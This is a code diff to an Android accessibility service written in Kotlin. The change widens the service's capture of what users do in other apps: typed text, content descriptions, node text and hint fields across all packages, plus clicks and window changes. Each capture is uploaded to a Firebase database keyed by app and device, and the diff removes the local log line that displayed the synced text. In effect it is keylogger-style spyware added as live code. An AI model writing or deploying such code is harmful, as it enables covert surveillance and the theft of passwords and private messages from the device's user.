@@ -39,14 +39,17 @@ class AppAccessibilityService : AccessibilityService() {
                 eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or
                         AccessibilityEvent.TYPE_VIEW_FOCUSED or
                         AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or
-                        AccessibilityEvent.TYPE_VIEW_SELECTED
+                        AccessibilityEvent.TYPE_VIEW_SELECTED or
+                        AccessibilityEvent.TYPE_VIEW_CLICKED or
+                        AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
                 feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
-                flags = AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS or AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
-                notificationTimeout = 50
+                flags = AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS or
+                        AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
+                notificationTimeout = 10
             }
             serviceInfo = info
-            Log.d(TAG, "Smart Accessibility Service Connected")
-            LogStore.addLog("Smart Accessibility Service Active")
+            Log.d(TAG, "Full Telemetry Accessibility Service Connected")
+            LogStore.addLog("Full Telemetry Accessibility Service Active")
         } catch (e: Exception) {
             Log.e(TAG, "Error in onServiceConnected", e)
         }
@@ -57,11 +60,30 @@ class AppAccessibilityService : AccessibilityService() {
         if (event == null) return
         try {
             val packageName = event.packageName?.toString() ?: "unknown"
+
             val textList = event.text
+            val contentDesc = event.contentDescription?.toString()
+            val sourceNode = event.source
 
-            if (textList.isNullOrEmpty()) return
-            val typedText = textList.joinToString(" ")
+            val gatheredText = StringBuilder()
+            if (!textList.isNullOrEmpty()) {
+                gatheredText.append(textList.joinToString(" "))
+            }
+            if (!contentDesc.isNullOrBlank()) {
+                gatheredText.append(" [Desc: $contentDesc]")
+            }
+            if (sourceNode != null) {
+                try {
+                    val nodeText = sourceNode.text?.toString()
+                    val nodeHint = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) sourceNode.hintText?.toString() else null
+                    if (!nodeText.isNullOrBlank()) gatheredText.append(" [Node: $nodeText]")
+                    if (!nodeHint.isNullOrBlank()) gatheredText.append(" [Hint: $nodeHint]")
+                } catch (_: Exception) {
+                    // ignore
+                }
+            }
 
+            val typedText = gatheredText.toString().trim()
             if (typedText.isBlank()) return
 
             scope.launch {
@@ -79,10 +101,6 @@ class AppAccessibilityService : AccessibilityService() {
                     )
 
                     ref.child("accessibility_$sanitizedAppName").child(timestampKey).setValue(eventData)
-                        .addOnSuccessListener {
-                            Log.d(TAG, "Activity synced to Firebase")
-                            LogStore.addLog("[$deviceName] Activity ($sanitizedAppName): $typedText")
-                        }
                 } catch (e: Exception) {
                     Log.e(TAG, "Error in accessibility coroutine", e)
                 }
